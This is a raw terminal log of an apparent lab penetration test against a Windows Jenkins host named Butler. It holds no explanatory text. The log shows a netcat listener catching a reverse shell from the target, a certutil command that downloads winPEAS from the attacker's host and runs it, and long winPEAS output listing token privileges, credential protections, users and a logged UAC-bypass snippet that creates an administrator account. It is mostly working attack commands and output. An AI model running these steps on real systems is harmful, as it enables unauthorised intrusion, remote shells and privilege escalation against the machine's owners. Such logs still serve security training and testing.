code
~~~
┌──(alpha㉿sploit)-[~/butler]
└─$ sudo nmap -sV -A -sC 192.168.1.20 -oN nmap
[sudo] password for alpha: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 18:46 EDT
                                                                                                                                                                       
┌──(alpha㉿sploit)-[~/butler]
└─$ nc -nvlp 1234
listening on [any] 1234 ...

connect to [192.168.1.19] from (UNKNOWN) [192.168.1.20] 49813
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>
C:\Program Files\Jenkins>systeminfo
systeminfo
^Z
zsh: suspended  nc -nvlp 1234
                                                                                                                                                                       
┌──(alpha㉿sploit)-[~/butler]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.1.19] from (UNKNOWN) [192.168.1.20] 49814
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>cd c:/
cd c:/

c:\>cd /users/public/Downloads
cd /users/public/Downloads

c:\Users\Public\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users\Public\Downloads

12/07/2019  02:14 AM    <DIR>          .
12/07/2019  02:14 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  13,151,707,136 bytes free

c:\Users\Public\Downloads>certutil.exe -urlcache -f http://192.168.1.19:4443/winPEASx64.exe winpeas.exe
certutil.exe -urlcache -f http://192.168.1.19:4443/winPEASx64.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\Public\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users\Public\Downloads

10/19/2023  05:03 AM    <DIR>          .
10/19/2023  05:03 AM    <DIR>          ..
10/19/2023  05:03 AM         2,387,456 winpeas.exe
               1 File(s)      2,387,456 bytes
               2 Dir(s)  13,138,657,280 bytes free

c:\Users\Public\Downloads>winpeas.exe
winpeas.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((                                                                                                                        
        (((((((((((((((((((((((((((((((((((((((((((                                                                                                                    
      ((((((((((((((**********/##########(((((((((((((                                                                                                                 
    ((((((((((((********************/#######(((((((((((                                                                                                                
    ((((((((******************/@@@@@/****######((((((((((                                                                                                              
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                                                            
    (((((********************/@@@@@%@@@@/********##(((((((((                                                                                                           
    (((############*********/%@@@@@@@@@/************((((((((                                                                                                           
    ((##################(/******/@@@@@/***************((((((                                                                                                           
    ((#########################(/**********************(((((                                                                                                           
    ((##############################(/*****************(((((                                                                                                           
    ((###################################(/************(((((                                                                                                           
    ((#######################################(*********(((((                                                                                                           
    ((#######(,.***.,(###################(..***.*******(((((                                                                                                           
    ((#######*(#####((##################((######/(*****(((((                                                                                                           
    ((###################(/***********(##############()(((((                                                                                                           
    (((#####################/*******(################)((((((                                                                                                           
    ((((############################################)((((((                                                                                                            
    (((((##########################################)(((((((                                                                                                            
    ((((((########################################)(((((((                                                                                                             
    ((((((((####################################)((((((((                                                                                                              
    (((((((((#################################)(((((((((                                                                                                               
        ((((((((((##########################)(((((((((                                                                                                                 
              ((((((((((((((((((((((((((((((((((((((                                                                                                                   
                 ((((((((((((((((((((((((((((((                                                                                                                        

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                             
                                                                                                                                                                       
  WinPEAS-ng by @hacktricks_live                                                                                                                                       

       /---------------------------------------------------------------------------------\                                                                             
       |                             Do you like PEASS?                                  |                                                                             
       |---------------------------------------------------------------------------------|                                                                             
       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                             
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                             
       |         Respect on HTB            :     SirBroccoli                             |                                                                             
       |---------------------------------------------------------------------------------|                                                                             
       |                                 Thank you!                                      |                                                                             
       \---------------------------------------------------------------------------------/                                                                             
                                                                                                                                                                       
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...                                                                                                     
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


�����������������������������������͹ System Information �������������������������������������

����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    OS Name: Microsoft Windows 10 Enterprise Evaluation
    OS Version: 10.0.19043 N/A Build 19043
    System Type: x64-based PC
    Hostname: Butler
    ProductName: Windows 10 Enterprise Evaluation
    EditionID: EnterpriseEval
    ReleaseId: 2009
    BuildBranch: vb_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 10/19/2023 5:04:07 AM
    HighIntegrity: True
    PartOfDomain: False
    Hotfixes: KB4601554, KB5000736, KB5001330, KB5001405, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [!] Windows version not supported, build number: '19043'

����������͹ Showing All Microsoft Updates
   HotFix ID                :   
   Installed At (UTC)       :   8/14/2021 6:53:46 PM
   Title                    :   VMware, Inc. - System - 9.8.16.0
   Client Application ID    :   Device Driver Retrieval Client
   Description              :   VMware, Inc. System  driver update released in  July 2019

   =================================================================================================


����������͹ System Last Shutdown Date/time (from Registry)
                                                                                                                                                                       
    Last Shutdown Date/time        :    8/15/2021 7:28:03 PM

����������͹ User Environment Variables
� Check for some passwords or keys in the env variables 
    COMPUTERNAME: BUTLER
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\butler\AppData\Local
    PSModulePath: %ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\butler\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    ProgramFiles: C:\Program Files
    USERPROFILE: C:\Users\butler
    SystemRoot: C:\Windows
    OS: Windows_NT
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    APPDATA: C:\Users\butler\AppData\Roaming
    PROCESSOR_REVISION: 4501
    USERNAME: butler
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OneDrive: C:\Users\butler\OneDrive
    WINSW_EXECUTABLE: C:\Program Files\Jenkins\jenkins.exe
    JENKINS_HOME: C:\Users\butler\AppData\Local\Jenkins\.jenkins
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 69 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SERVICE_ID: jenkins
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Users\butler\AppData\Local\Temp
    WINSW_SERVICE_ID: jenkins
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\butler\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: BUTLER
    BASE: C:\Program Files\Jenkins

����������͹ System Environment Variables
� Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 69 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4501

����������͹ Audit Settings
� Check what is being logged 
    Not Found

����������͹ Audit Policy Settings - Classic & Advanced

����������͹ WEF Settings
� Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

����������͹ LAPS Settings
� If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

����������͹ Wdigest
� If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

����������͹ LSA Protection
� If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection                                                                                            
    LSA Protection is not enabled

����������͹ Credentials Guard
� If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

����������͹ Cached Creds
� If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials                                                                                                                                              
    cachedlogonscount is 10

����������͹ Enumerating saved credentials in Registry (CurrentPass)

����������͹ AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe

����������͹ Windows Defender configuration
  Local Settings
  Group Policy Settings

����������͹ UAC Status
� If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                                                                                                                
    ConsentPromptBehaviorAdmin: 1 - PromptOnSecureDesktop
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                                                                                       

����������͹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

����������͹ Enumerating PowerShell Session Settings using the registry
    Name                                   Microsoft.PowerShell
      BUILTIN\Administrators               AccessAllowed         
      NT AUTHORITY\INTERACTIVE             AccessAllowed         
      BUILTIN\Remote Management Users      AccessAllowed         
   =================================================================================================

    Name                                   Microsoft.PowerShell.Workflow
      BUILTIN\Administrators               AccessAllowed         
      BUILTIN\Remote Management Users      AccessAllowed         
   =================================================================================================

    Name                                   Microsoft.PowerShell32
      BUILTIN\Administrators               AccessAllowed         
      NT AUTHORITY\INTERACTIVE             AccessAllowed         
      BUILTIN\Remote Management Users      AccessAllowed         
   =================================================================================================


����������͹ PS default transcripts history
� Read the PS history inside these files (if any)

����������͹ HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    EnableNegotiate: 1
    ProxyEnable: 0
    MigrateProxy: 1
    WarnonZoneCrossing: 0
    LockDatabase: 132734157290955225

����������͹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

����������͹ Drives Information
� Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 12 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories], Administrators [AllAccess])

����������͹ Checking WSUS
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

����������͹ Checking KrbRelayUp
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system isn't inside a domain, so it isn't vulnerable

����������͹ Checking If Inside Container
� If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

����������͹ Enumerate LSA settings - auth packages included
                                                                                                                                                                       
    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       648
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       4
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

����������͹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                                                                                       

  NTLM Signing Settings                                                                                                                                                
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                                                                                     
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                                                                                       

  NTLM Auditing and Restrictions                                                                                                                                       
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

����������͹ Display Local Group Policy settings - local users/machine

����������͹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



����������͹ Enumerating Printers (WMI)
      Name:                    OneNote
      Status:                  Unknown
      Sddl:                    O:SYD:(A;CIIO;RC;;;CO)(A;OIIO;RPWPSDRCWDWO;;;CO)(A;;SWRC;;;AC)(A;CIIO;RC;;;AC)(A;OIIO;RPWPSDRCWDWO;;;AC)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;RC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1001)(A;;LCSWSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1001)(A;OIIO;RPWPSDRCWDWO;;;LS)(A;;LCSWSDRCWDWO;;;LS)(A;OIIO;RPWPSDRCWDWO;;;BA)(A;;LCSWSDRCWDWO;;;BA)
      Is default:              False
      Is network printer:      False

   =================================================================================================

      Name:                    Microsoft XPS Document Writer
      Status:                  Unknown
      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              False
      Is network printer:      False

   =================================================================================================

      Name:                    Microsoft Print to PDF
      Status:                  Unknown
      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              True
      Is network printer:      False

   =================================================================================================

      Name:                    Fax
      Status:                  Unknown
      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-1875598273-2479178766-1212885099-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              False
      Is network printer:      False

   =================================================================================================


����������͹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  SearchTextHarvester                                                                                  Administrators [AllAccess]                                             O:SYG:SYD:P(D;;FA;;;NU)(D;;FA;;;BG)(A;;FR;;;IU)(A;;FA;;;SY)(A;;FA;;;BA)

  vgauth-service                                                                                       Everyone [WriteData/CreateFiles], Administrators [AllAccess]           O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)

  Winsock2\CatalogChangeListener-1f4-0                                                                 Administrators [WriteData/CreateFiles]                                 O:BAG:SYD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)

  Winsock2\CatalogChangeListener-278-0                                                                 Administrators [WriteData/CreateFiles]                                 O:BAG:SYD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)

  Winsock2\CatalogChangeListener-288-0                                                                 Administrators [WriteData/CreateFiles]                                 O:BAG:SYD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)

  Winsock2\CatalogChangeListener-2e8-0                                                                 Administrators [WriteData/CreateFiles]                                 O:SYG:SYD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)

  Winsock2\CatalogChangeListener-35c-0                                                                 Administrators [WriteData/CreateFiles]                                 O:NSG:NSD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)

  Winsock2\CatalogChangeListener-3bc-0                                                                 Administrators [WriteData/CreateFiles]                                 O:SYG:SYD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)

  Winsock2\CatalogChangeListener-3dc-0                                                                 Administrators [WriteData/CreateFiles]                                 O:LSG:LSD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)

  Winsock2\CatalogChangeListener-70c-0                                                                 Administrators [WriteData/CreateFiles]                                 O:SYG:SYD:(D;;FW;;;NU)(A;;0x120196;;;SY)(A;;0x120196;;;BA)


����������͹ Enumerating AMSI registered providers

����������͹ Enumerating Sysmon configuration
      Installed:                False
      Hashing Algorithm:        Not Defined
      Options:                  Not Defined
      Rules:                    

   =================================================================================================


����������͹ Enumerating Sysmon process creation logs (1)
      Unable to query Sysmon event logs, Sysmon likely not installed.

����������͹ Installed .NET versions
                                                                                                                                                                       
  CLR Versions
   4.0.30319

  .NET Versions                                                                                                                                                        
   4.8.04084

  .NET & AMSI (Anti-Malware Scan Interface) support                                                                                                                    
      .NET version supports AMSI     : True
      OS supports AMSI               : True
        [!] The highest .NET version is enrolled in AMSI!


�����������������������������������͹ Interesting Events information �������������������������������������

����������͹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
                                                                                                                                                                       

����������͹ Printing Account Logon Events (4624) for the last 10 days.
                                                                                                                                                                       

����������͹ Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                                                                                       

����������͹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                                                                                       
   User Id         :        S-1-5-21-1875598273-2479178766-1212885099-1001
   Event Id        :        4104
   Context         :        Param (
#required
#You can also generate a custom command with -custom "cmd.exe /c <command here>".  Mind the quotations in their positions as they are
net user test123 Password123! /add && net localgroup administrators test123 /add" #default
)
#Registry Command Edit
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
   Created At      :        8/14/2021 6:20:27 AM
   Command line    :        net user test123 Password123! /add && net localgroup administrators test123 /add" #default

   =================================================================================================


����������͹ Displaying Power off/on events for last 5 days
                                                                                                                                                                       


�����������������������������������͹ Users Information �������������������������������������

����������͹ Users
� Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  Current user: butler
  Current groups: Domain Users, Everyone, Local account and member of Administrators group, Administrators, Users, Service, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    BUTLER\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    BUTLER\butler
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-NotReq

    BUTLER\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    BUTLER\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    BUTLER\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


����������͹ Current User Idle Time
   Current User   :     BUTLER\butler
   Idle Time      :     00h:26m:14s:828ms

����������͹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
    SeIncreaseQuotaPrivilege: DISABLED
    SeSecurityPrivilege: DISABLED
    SeTakeOwnershipPrivilege: DISABLED
    SeLoadDriverPrivilege: DISABLED
    SeSystemProfilePrivilege: DISABLED
    SeSystemtimePrivilege: DISABLED
    SeProfileSingleProcessPrivilege: DISABLED
    SeIncreaseBasePriorityPrivilege: DISABLED
    SeCreatePagefilePrivilege: DISABLED
    SeBackupPrivilege: DISABLED
    SeRestorePrivilege: DISABLED
    SeShutdownPrivilege: DISABLED
    SeDebugPrivilege: SE_PRIVILEGE_ENABLED
    SeSystemEnvironmentPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeRemoteShutdownPrivilege: DISABLED
    SeUndockPrivilege: DISABLED
    SeManageVolumePrivilege: DISABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
    SeCreateSymbolicLinkPrivilege: DISABLED
    SeDelegateSessionUserImpersonatePrivilege: DISABLED

����������͹ Clipboard text

����������͹ Logged users
    BUTLER\butler

����������͹ Display information about local users
   Computer Name           :   BUTLER
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   8/15/2021 7:27:25 PM
   Logons Count            :   10
   Password Last Set       :   8/14/2021 5:26:01 AM

   =================================================================================================

   Computer Name           :   BUTLER
   User Name               :   butler
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   
   Last Logon              :   10/19/2023 2:41:17 PM
   Logons Count            :   25
   Password Last Set       :   8/14/2021 5:06:17 AM

   =================================================================================================

   Computer Name           :   BUTLER
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   BUTLER
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   BUTLER
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   8/14/2021 4:42:39 AM

   =================================================================================================


����������͹ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        butler         BUTLER                   Active    

����������͹ Ever logged users
    BUTLER\Administrator
    BUTLER\butler

����������͹ Home folders found
    C:\Users\Administrator : Administrators [AllAccess]
    C:\Users\All Users : Administrators [AllAccess]
    C:\Users\butler : Administrators [AllAccess], butler [AllAccess]
    C:\Users\Default : Administrators [AllAccess]
    C:\Users\Default User : Administrators [AllAccess]
    C:\Users\Public : Service [WriteData/CreateFiles], Administrators [AllAccess]

����������͹ Looking for AutoLogon credentials
    Not Found

����������͹ Password Policies
� Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: BUTLER
    SID: S-1-5-21-1875598273-2479178766-1212885099
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================


����������͹ Print Logon Sessions
    Method:                       LSA
    Logon Server:                 BUTLER
    Logon Server Dns Domain:      
    Logon Id:                     235577
    Logon Time:                   10/19/2023 9:41:17 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       BUTLER
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    butler
    User Principal Name:          
    User SID:                     S-1-5-21-1875598273-2479178766-1212885099-1001

   =================================================================================================

    Method:                       LSA
    Logon Server:                 BUTLER
    Logon Server Dns Domain:      
    Logon Id:                     235546
    Logon Time:                   10/19/2023 9:41:17 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       BUTLER
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    butler
    User Principal Name:          
    User SID:                     S-1-5-21-1875598273-2479178766-1212885099-1001

   =================================================================================================

    Method:                       LSA
    Logon Server:                 BUTLER
    Logon Server Dns Domain:      
    Logon Id:                     100339
    Logon Time:                   10/19/2023 9:39:19 PM
    Logon Type:                   Service
    Start Time:                   
    Domain:                       BUTLER
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    butler
    User Principal Name:          
    User SID:                     S-1-5-21-1875598273-2479178766-1212885099-1001

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     65594
